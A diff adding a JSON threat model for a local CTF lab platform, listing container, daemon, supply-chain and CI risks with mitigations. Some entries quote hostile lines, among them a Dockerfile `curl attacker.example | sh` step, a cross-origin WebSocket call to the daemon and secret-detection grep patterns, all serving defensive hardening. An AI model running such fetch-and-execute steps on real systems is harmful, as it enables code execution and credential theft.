@@ -1,0 +1,134 @@
+{
+  "risks": [
+    {
+      "risk": "Any lab requiring --privileged, /var/run/docker.sock mount, --pid=host, --ipc=host, or dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_NET_ADMIN) gives the container's root process a straight path to host root. A container-breakout lab or a compromised third-party lab shipped with these flags = host takeover for every learner.",
+      "severity": "critical",
+      "mitigation": "Enforce an allowlist in labctl: parse each lab.yaml/compose file server-side and reject --privileged, docker.sock mounts, host namespaces, and non-default caps unless the lab is signed by a trusted maintainer key AND the user clicks through a red 'this lab requires host-equivalent privileges' consent dialog per-lab, per-session. For labs that legitimately need kernel features, prefer rootless Docker, gVisor/Kata runtime (runsc), user namespace remap (dockerd --userns-remap), --cap-drop=ALL then add only the specific caps, and seccomp/apparmor profiles committed alongside the lab."
+    },
+    {
+      "risk": "Default bridge network lets every running container (including labs from other exercises the user forgot to stop) resolve and reach each other, enabling cross-lab flag exfiltration and letting a malicious lab pivot into a victim lab's admin panel.",
+      "severity": "high",
+      "mitigation": "labctl must create a unique user-defined bridge per lab session (name = lab-slug + random suffix), attach only that lab's containers, and tear it down on stop. Set --network=none where labs don't need network. For the hub UI itself, never share a network with lab containers. Add an integration test that spins up two labs simultaneously and asserts ping/HTTP between them fails."
+    },
+    {
+      "risk": "Base images referenced by tag (ubuntu:22.04, node:20, alpine:latest) are mutable — a compromised or squatted upstream flips the digest under you and every learner pulls a backdoored image on next `docker build`.",
+      "severity": "high",
+      "mitigation": "Pin every FROM in every Dockerfile to a sha256 digest (`FROM ubuntu:22.04@sha256:...`). Add a CI check that fails PRs introducing unpinned FROMs. Verify Docker Official Images via `cosign verify` against Docker's public key in the build step. Maintain a curated mirror of allowed base digests and rebuild-on-demand rather than pulling from Hub at learner runtime. Document a monthly digest-refresh cadence with SBOM diff review."
+    },
+    {
+      "risk": "apt/pip/npm/apk installs inside Dockerfiles are unpinned and unverified, so any lab's build is a live curl-to-shell against the internet.",
+      "severity": "medium",
+      "mitigation": "Pin package versions (apt: =version, pip: ==version + --require-hashes with a requirements.txt.sha256, npm: package-lock.json + npm ci --ignore-scripts). Prefer vendored tarballs checked into the lab repo with an in-repo SHA256SUMS file over network pulls at build time. Run builds in an isolated network namespace with no egress except to a pinned mirror."
+    },
+    {
+      "risk": "The flag baked into an image is trivially recoverable via `docker history --no-trunc`, `docker inspect` (ENV), layer tar extraction, or `strings` on the final rootfs — defeating the exercise and letting a determined learner grep every lab in one loop.",
+      "severity": "high",
+      "mitigation": "Never bake the flag as an ENV, ARG, LABEL, or plaintext file in the image. Inject at container start via labctl passing a per-session random flag through a tmpfs mount or env at `docker run` time. Better: labctl generates a per-user HMAC(secret, user_id||lab_id||session_id) as the flag, and the lab's verifier calls back to labctl to validate rather than the flag living in the container at all. Add a CI job that runs `docker history` + `dive` against every built image and greps for the sentinel flag prefix to fail the build."
+    },
+    {
+      "risk": "Flag leaks through side channels a lab author didn't anticipate: /root/.bash_history preserved in the image, /var/cache/apt indexes, npm cache, error pages dumping env vars on 500, CMD scripts echoing $FLAG, or Dockerfile RUN steps that `echo $FLAG > /tmp/x && rm /tmp/x` (rm doesn't remove from a prior layer).",
+      "severity": "medium",
+      "mitigation": "Multi-stage builds: final stage FROM scratch or distroless, copy only the needed binaries. Add `HISTFILE=/dev/null` and `rm -rf /root/.bash_history /var/cache/apt /root/.npm /tmp/*` in the final layer, and squash. CI check: for each lab, extract each layer's tar, grep for the flag pattern, fail on hit. Standardize a lab-verifier binary that takes the guess and returns pass/fail without ever exposing the flag string in a response body or log line."
+    },
+    {
+      "risk": "Bind mounts specified as user-editable paths (e.g. `${HOME}/lab-data:/data`) let a malicious lab's entrypoint run `rm -rf /data/*` and, if the user was talked into mounting $HOME or /, wipe their machine. Symlinks inside the mount can be followed by the container to escape the intended dir.",
+      "severity": "high",
+      "mitigation": "labctl owns mount path construction — never accept a mount source from the lab manifest. All lab state goes under a labctl-managed sandbox directory (e.g. ~/.labctl/sessions/<uuid>/) created fresh per session and mounted :ro wherever possible. Refuse manifests that request mounts outside the sandbox. Set no-new-privileges and read-only root filesystem on containers, with an explicit tmpfs for /tmp. Preflight resolves the sandbox path and refuses to start if it resolves to $HOME, /, or a parent of $HOME."
+    },
+    {
+      "risk": "labctl WebSocket on ws://localhost:5174 with no origin check or auth: any tab the learner has open (an ad iframe, a Discord embed) can `new WebSocket('ws://localhost:5174')` and drive the daemon — start labs, read/write the sandbox, exfiltrate the SQLite, submit flags. Same-origin does not block WebSocket connections; browsers send the connection with the tab's Origin but do not enforce it.",
+      "severity": "critical",
+      "mitigation": "Bind explicitly to 127.0.0.1 (never 0.0.0.0 or ::) and reject connections from other addresses at accept-time. Enforce Origin allowlist server-side on the WS upgrade handshake — accept only https://hub.<yourdomain> and the local dev origin — and close with 1008 on mismatch. Require a per-install bearer token: labctl writes it to a 0600 file, the hub UI reads it via a one-time browser-registered handler (or the user pastes it once), and every WS frame carries it. Rotate on daemon restart. DNS-rebinding defense: verify Host header is `localhost` or `127.0.0.1` exactly."
+    },
+    {
+      "risk": "A malicious lab writes into the shared sandbox a writeup.md / metadata.json that the hub UI later renders — stored XSS in the hub, and since the hub speaks to the trusted daemon, XSS = full local RCE via the daemon's start-lab endpoint.",
+      "severity": "critical",
+      "mitigation": "Treat every file produced by a lab container as untrusted. Render markdown through a strict sanitizer (rehype-sanitize with a small allowlist, no raw HTML, no javascript: URLs, no data: images) inside a sandboxed iframe with a strict CSP (`default-src 'none'; script-src 'none'; style-src 'unsafe-inline'`). Never eval or new Function on lab-provided JSON. Validate lab manifests against a JSON schema before use. Bind the daemon's WS auth token to Origin so even a hub-XSS cannot pivot without also spoofing origin."
+    },
+    {
+      "risk": "CSRF against the daemon from any random website the learner visits — a POST to http://127.0.0.1:5174/start with a crafted body starts an attacker-chosen lab, or in worse designs runs an arbitrary Dockerfile.",
+      "severity": "high",
+      "mitigation": "Require the bearer token above on every request (WS and HTTP). Reject requests with no Origin header or with Content-Type that browsers permit for simple CORS requests (application/x-www-form-urlencoded, text/plain) — force application/json + custom header, which triggers a CORS preflight the daemon then rejects. Never accept a lab image reference from the request body — accept only a slug that resolves to a curated, signed manifest catalog fetched independently."
+    },
+    {
+      "risk": "The hub-to-daemon channel might accept a `dockerfile` or `image` string from the hub and run it — meaning a hub-XSS or a compromise of the hub's static hosting becomes universal RCE across every installed learner.",
+      "severity": "critical",
+      "mitigation": "Daemon accepts only opaque lab identifiers. The identifier maps, inside the daemon, to a locally cached manifest whose image digest was verified against a signed catalog (cosign-signed by a project key with a public key pinned in the daemon binary). No path exists to run an image not in the catalog. Catalog updates require a signed release and daemon restart; log every catalog change."
+    },
+    {
+      "risk": "The local SQLite of progress/writeups/attempted-flags could carry PII (usernames, notes, screenshots) and be shipped as telemetry to a project server, or synced to iCloud/OneDrive/Dropbox if it lands under a synced folder.",
+      "severity": "medium",
+      "mitigation": "Store the DB under an OS-appropriate app-data dir explicitly outside common sync roots ($XDG_DATA_HOME / %LOCALAPPDATA% / ~/Library/Application Support). Telemetry off by default with a clear opt-in; if on, hash user_id, ship only counters and lab-slug/completed booleans — never writeup text, never flag guesses, never file paths. Publish the exact telemetry schema in the repo and provide `labctl telemetry --dump` that prints the next payload before it is sent. Set 0600 perms on the DB file."
+    },
+    {
+      "risk": "Windows/WSL2: Dockerfiles or entrypoints authored with LF get committed as CRLF by Git for Windows and fail inside the container with cryptic `bash\\r: not found`. Bind mounts under /mnt/c cross a slow 9p bridge and drop Linux perms, so setuid/permission-bit exercises silently pass or fail nondeterministically. Docker context confusion (Docker Desktop vs WSL native) breaks docker.sock paths.",
+      "severity": "medium",
+      "mitigation": "Ship a repo-root `.gitattributes` with `* text=auto eol=lf` and force `*.sh`, `Dockerfile*`, `entrypoint*` to `text eol=lf`. Preflight in labctl checks each script for `\\r` bytes and refuses to start with a clear fix message. Detect Windows + Docker Desktop and warn if the sandbox dir is under /mnt/c/…, recommending a WSL-native path. Document required Docker context (Linux containers, WSL2 backend) and refuse to run on Hyper-V/Windows-containers mode."
+    },
+    {
+      "risk": "macOS Apple Silicon (arm64) pulling amd64 images silently activates QEMU emulation — some exploit labs (stack layout, ROP gadgets, timing-sensitive races) behave differently or crash, and learners chase phantom bugs.",
+      "severity": "medium",
+      "mitigation": "Build every image via `docker buildx build --platform linux/amd64,linux/arm64` and push a manifest list; verify both digests in the signed catalog. For labs that must be amd64 (specific exploit primitives), mark them in the manifest and have labctl detect arm64 hosts, refuse to start, and show a clear message rather than silently emulating. Add CI matrix jobs on both arches."
+    },
+    {
+      "risk": "GitHub Actions `pull_request_target` or `workflow_run` on a repo that runs contributor-submitted Dockerfiles = trivial RCE with the base repo's GITHUB_TOKEN and secrets exposed to a fork PR. Even `pull_request` becomes dangerous the moment a workflow does `docker build .` on the PR tree without isolation.",
+      "severity": "critical",
+      "mitigation": "Never use pull_request_target for anything that checks out or executes PR code. Use `pull_request` with `permissions: {contents: read}` only, GITHUB_TOKEN scoped to read, and no secrets available in the untrusted job. Split into two workflows: (1) untrusted `pull_request` job builds and tests in isolation, produces artifacts; (2) `workflow_run` triggered on the first, running on trusted context, downloads the artifact and only then does signing/publishing — never re-executes PR code. Require reviewer approval for first-time contributors."
+    },
+    {
+      "risk": "Docker-in-Docker or docker.sock in CI runs the PR's Dockerfile which can `RUN curl attacker.example | sh` and exfiltrate every secret the runner ever saw, including cached credentials in ~/.docker/config.json and OIDC tokens.",
+      "severity": "high",
+      "mitigation": "Build PR images in an ephemeral runner with `--network=none` egress except to a pinned mirror, use `docker buildx build --no-cache --output=type=oci,dest=out.tar` so the build stays in a fresh buildkit instance, then scan the tarball rather than running the built image. Never mount docker.sock into a build step. Use OIDC short-lived tokens for any publish step and only in the trusted `workflow_run` half. Rotate any long-lived registry credential; prefer keyless signing (cosign OIDC)."
+    },
+    {
+      "risk": "Self-hosted GitHub Actions runners for public repos = anyone opening a PR runs code as your runner user, and non-ephemeral runners let a first PR poison /tmp, ~/.docker, PATH shims, and env for every subsequent job.",
+      "severity": "critical",
+      "mitigation": "Do not use self-hosted runners for public repos. If unavoidable, use ephemeral (single-job) runners via actions/runner autoscaler or GitHub-hosted larger runners, each in a fresh VM. Never label a self-hosted runner such that a fork PR can target it — restrict `runs-on` to labels only reachable from trusted branches, and set the org-level policy `Fork pull request workflows from outside collaborators: Require approval for all outside collaborators`. Runners live in a dedicated network segment with no path to internal systems."
+    },
+    {
+      "risk": "GitHub Actions cache poisoning: a malicious PR writes a cache key that a later main-branch job restores, injecting attacker-controlled binaries into a release.",
+      "severity": "high",
+      "mitigation": "Scope cache keys to a branch namespace (`key: ${{ github.ref }}-...`), and never restore untrusted-branch caches into main/release jobs. Prefer `actions/cache/restore` with explicit refs; do not fall back to a partial key hit from a PR branch. Verify cache-restored toolchains by digest at start of the release job."
+    },
+    {
+      "risk": "Third-party Actions pinned by tag (`@v3`) can be hijacked or moved to a malicious commit by the maintainer, silently running attacker code in every workflow run.",
+      "severity": "medium",
+      "mitigation": "Pin every third-party action by full commit SHA (`uses: foo/bar@ab12cd34...`). Add Dependabot for actions with weekly PRs (reviewed, not auto-merged). Prefer GitHub-first-party actions when possible. Add a repo policy (Settings → Actions) restricting allowed actions to a curated list."
+    },
+    {
+      "risk": "Time-of-check/time-of-use and replay in flag verification: two learners share a flag string (or one learner submits the same flag to different labs) because the daemon accepts the raw string without binding to user+lab+session.",
+      "severity": "medium",
+      "mitigation": "Per-user, per-session flags: flag = HMAC(server_secret, user_id || lab_id || session_id). Verifier compares HMACs, never the raw flag. Rate-limit submission (exponential backoff after 5 wrong guesses, session-scoped). Log all attempts to an append-only local audit log; the daemon refuses cross-lab flag reuse."
+    },
+    {
+      "risk": "labctl auto-update path: if the daemon pulls its own updates, that channel is a universal RCE. If it doesn't, learners run stale, unpatched daemons for years.",
+      "severity": "high",
+      "mitigation": "Ship updates only as signed binaries (cosign or minisign) with the public key pinned in the previous version. Verify signature and version-must-increase before applying. Prompt the user; never silent-install. Publish signed SBOMs alongside releases. Rate-limit update checks and fail closed if signature fetch fails (do not fall back to unsigned)."
+    },
+    {
+      "risk": "Ports the lab publishes with `-p 8080:8080` bind to 0.0.0.0 by default on Linux, exposing a possibly-vulnerable lab (that's the point — SQLi, RCE) to the learner's whole LAN and to hotel/coffee-shop Wi-Fi.",
+      "severity": "high",
+      "mitigation": "labctl always constructs port publishes as `-p 127.0.0.1:HOST:CONTAINER` (never bare `-p`). Refuse manifests that specify a non-loopback publish. Document that any lab reachable at http://localhost:… must never be exposed via a tunnel. Preflight scans `docker ps --format` after start and warns if a container listens on 0.0.0.0."
+    },
+    {
+      "risk": "labctl running as the learner's user still has full access to their filesystem — a bug in the lab-manifest parser (path traversal, TOCTOU) or in the hub-to-daemon RPC could let a lab overwrite ~/.ssh/authorized_keys or ~/.bashrc.",
+      "severity": "high",
+      "mitigation": "Run labctl as a dedicated OS user where possible (systemd DynamicUser=yes on Linux; a helper LaunchDaemon user on macOS). Wherever it must run as the learner, drop into a chroot / bwrap sandbox for filesystem-touching operations, with an allow-list of writable paths (the sandbox dir only). Static-analyze the RPC surface with a fuzzer against the manifest parser. Never resolve symlinks with follow=true when constructing paths."
+    },
+    {
+      "risk": "Lab image layers may inadvertently ship .git, .env, aws credentials, SSH keys, or the maintainer's local dotfiles because `COPY . /app` was used in a lab template.",
+      "severity": "medium",
+      "mitigation": "Ship a template Dockerfile that uses explicit COPY paths, and a repo-level `.dockerignore` template covering `.git`, `.env*`, `**/.aws`, `**/.ssh`, `node_modules`, `__pycache__`. CI runs `dive` or `syft` on each built image and greps layers for `id_rsa`, `AKIA`, `BEGIN PRIVATE KEY`, `.env`, `.git/config` and fails on hit. Contributor PR template asks explicitly."
+    },
+    {
+      "risk": "Multi-user host (shared lab machine, classroom): the daemon's 0600 token file and 127.0.0.1 socket are per-machine, not per-user — another local user can read the token file if perms slip or connect to the socket if the daemon runs as root.",
+      "severity": "medium",
+      "mitigation": "Prefer a Unix domain socket in $XDG_RUNTIME_DIR (0700) over a TCP loopback socket on Linux/macOS; on Windows use a named pipe with a per-user DACL. Verify peer UID via SO_PEERCRED (Linux) / LOCAL_PEERCRED (macOS) on every connection and reject mismatched UIDs. Refuse to run as root. Document explicitly that a shared host is unsupported; suggest one daemon per user account."
+    },
+    {
+      "risk": "Container image or lab repo tampering after download: the local image cache is trusted forever after first pull, so an attacker with brief filesystem access can replace an image without changing tags.",
+      "severity": "low",
+      "mitigation": "Pin by digest in the catalog and re-verify with `docker image inspect --format '{{.Id}}'` matches the expected digest before every `docker run`. Store the expected digest in the catalog signed blob. On mismatch, refuse to start and re-pull from the pinned digest URL."
+    }
+  ]
+}
